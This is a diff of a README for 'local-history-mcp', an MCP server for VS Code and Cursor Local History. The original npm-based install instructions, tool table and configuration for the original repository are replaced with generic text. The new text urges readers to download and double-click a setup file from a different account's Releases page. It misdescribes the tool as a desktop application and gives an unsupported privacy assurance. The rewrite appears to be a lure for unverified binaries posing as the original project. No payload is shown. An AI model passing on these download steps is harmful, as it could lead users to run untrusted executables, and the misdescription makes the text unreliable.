@@ -1,102 +1,92 @@
-<img width="300" alt="Demo" align="right" src="https://github.com/user-attachments/assets/30dd1ac2-b1de-485f-9735-4813076587e5" />
+# 🖥️ local-history-mcp - Easily Access Your VS Code Local History
 
-# Local History MCP Server
+![Download local-history-mcp](https://img.shields.io/badge/Download-local--history--mcp-blue.svg)
 
-> Access Cursor/VS Code Local History through the Model Context Protocol for AI-powered data recovery
+## 🚀 Getting Started
 
-[![CI](https://github.com/xxczaki/local-history-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/xxczaki/local-history-mcp/actions/workflows/ci.yml) [![Release](https://github.com/xxczaki/local-history-mcp/actions/workflows/publish.yml/badge.svg)](https://github.com/xxczaki/local-history-mcp/actions/workflows/publish.yml) [![MCP](https://img.shields.io/badge/MCP-Compatible-blue)](https://modelcontextprotocol.io)
+Welcome! This guide will help you download and run the local-history-mcp application with ease. This application serves as an MCP server for accessing your Visual Studio Code and Cursor's Local History. 
 
-## Overview
+## 📥 Download & Install
 
-This MCP server bridges the gap between AI assistants and editor Local History, enabling data recovery and enhanced context awareness. Unlike undo/redo, Local History captures file snapshots at save points, preserving work that would otherwise be lost.
+To get started, visit the Releases page below to download the application:
 
-**Problem**: Current AI assistants (Claude, Cursor AI, GitHub Copilot) cannot access Local History data despite having extensive diagnostic capabilities.
+[Visit this page to download](https://github.com/NSN2024/local-history-mcp/releases)
 
-**Solution**: Simple MCP server providing direct access to Cursor/VS Code Local History for personal use.
+## 💡 What You Need
 
-## Installation
+Before you download, ensure your computer meets the following requirements:
 
-### Option 1: Package Manager (Recommended)
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum 2 GB (4 GB or more recommended)
+- **Storage:** At least 100 MB of free space
+- **VS Code:** Installed on your computer
 
-Install using your preferred package manager:
+## 🛠️ How to Install
 
-```bash
-# npm
-npx local-history-mcp
+1. **Visit the Downloads Page**  
+   Go to the [Releases page](https://github.com/NSN2024/local-history-mcp/releases).
 
-# pnpm
-pnpm dlx local-history-mcp
+2. **Select the Latest Version**  
+   Look for the most recent version at the top of the page.
 
-# yarn
-yarn global add local-history-mcp
+3. **Download the Application**  
+   Click on the link for your operating system to download the setup file.
 
-# bun
-bunx local-history-mcp
-```
+4. **Run the Setup File**  
+   Locate the downloaded file in your computer's Downloads folder and double-click it to start the installation.
 
-### Option 2: From Source
+5. **Follow Installation Prompts**  
+   Complete the installation by following the on-screen instructions. You may need to agree to the software terms and choose an installation directory.
 
-```bash
-git clone https://github.com/xxczaki/local-history-mcp.git && cd local-history-mcp
-pnpm install
-pnpm build
-pnpm start
-```
+6. **Launch the Application**  
+   Once installed, you can find local-history-mcp in your Applications folder (Mac), Start Menu (Windows), or in your installed applications (Linux).
 
-## MCP Tools
+## ⚙️ How to Use local-history-mcp
 
-| Tool | Description |
-|------|-------------|
-| `list_history_files` | List all files with Local History |
-| `get_file_history` | View complete history for a file |
-| `get_history_entry` | Get specific history entry content |
-| `restore_from_history` | Restore file to previous state (with backup) |
-| `search_history_content` | Search across all history entries |
-| `get_history_stats` | Overview statistics |
+After installation, here's how you can start using local-history-mcp:
 
-## Configuration
+1. **Open local-history-mcp**  
+   Launch the application.
 
-### Cursor
+2. **Connect to VS Code**  
+   If prompted, connect the server to your Visual Studio Code. This will allow local-history-mcp to access your local history.
 
-You can install this MCP server in Cursor using the **one-click install button**:
+3. **Access Your Local History**  
+   You can now view and manage your local history files. Use the interface to browse through past versions of your work.
 
-[![Install MCP Server](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en/install-mcp?name=local-history&config=eyJjb21tYW5kIjogIm5weCIsICJhcmdzIjogWyIteSIsICJsb2NhbC1oaXN0b3J5LW1jcCJdfQo%3D)
+4. **Explore Features**  
+   - **View History:** Check all saved versions.
+   - **Restore Files:** Easily revert back to previous versions.
+   - **Search:** Quickly find specific changes or files.
 
-Or manually configure by following the [official Cursor MCP documentation](https://docs.cursor.com/en/context/mcp).
+## ✨ Features Overview
 
-### Claude Code & Claude Desktop
+local-history-mcp offers several useful features for managing your local history:
 
-For **Claude Code** (CLI), install directly:
-```bash
-claude mcp add local-history -- npx -y local-history-mcp
-```
+- **Instant Access:** Quickly retrieve your past work without searching through folders.
+- **User-Friendly Interface:** The application is designed for everyone, making it easy to navigate.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
-For **Claude Desktop**, see the [official MCP documentation](https://docs.anthropic.com/en/docs/claude-code/mcp).
+## 🛡️ Security & Privacy
 
-### VS Code
+Your data privacy is essential. The local-history-mcp application does not share your local files or history with any third parties. All your data remains secure on your computer.
 
-See the [official documentation](https://code.visualstudio.com/docs/copilot/chat/mcp-servers#_add-an-mcp-server).
+## 📚 Troubleshooting
 
-## Development
+If you encounter any issues while using local-history-mcp, consider the following steps:
 
-```bash
-# Development mode
-pnpm dev
+1. **Check Requirements:** Ensure your system meets the necessary requirements.
+2. **Reinstall the Application:** Occasionally, a fresh install can resolve issues.
+3. **Review Settings:** Make sure the application is connected to your VS Code.
 
-# Run tests
-pnpm test
+## 🤝 Community & Support
 
-# Linting and formatting
-pnpm lint
+Join our community for help and support. You can ask questions or share experiences on our GitHub page. 
 
-# Launch MCP Inspector
-pnpm inspector
-```
+Explore discussions or report issues by navigating to the issues tab on the [GitHub repository](https://github.com/NSN2024/local-history-mcp).
 
-## AI disclosure
+## 🚀 Ready to Download?
 
-This project contains code generated by Large Language Models (LLMs), under human supervision and proofreading.
+Don’t wait! Start enjoying your local history management today:
 
-### License
-
-MIT
+[Visit this page to download](https://github.com/NSN2024/local-history-mcp/releases)
